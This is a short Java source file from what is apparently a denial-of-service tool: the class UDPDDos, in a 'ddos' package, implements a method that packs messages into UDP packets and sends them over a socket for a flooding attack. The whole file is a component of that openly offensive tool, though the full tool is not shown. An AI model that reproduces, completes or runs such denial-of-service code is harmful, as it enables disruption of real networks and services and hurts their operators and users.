
package ddos.protocols.implementations;

import ddos.DDOSPattern;
import ddos.DDOSer;
import ddos.protocols.interfaces.UDP;
import java.io.IOException;


public class UDPDDos extends UDP {

    
    public UDPDDos(DDOSPattern ddosPattern) {
        super(ddosPattern);
    }
    
    @Override
    public void writeLineToSocket(String message) {
        byte[] data = message.getBytes();
        getPacket().setData(data);
        getPacket().setLength(data.length);
        try {
            getSocket().send(getPacket());
        } catch (IOException ex) {
            DDOSer.appendToConsole("Error while connecting a Socket!");
            ex.printStackTrace();
        }
    }
}
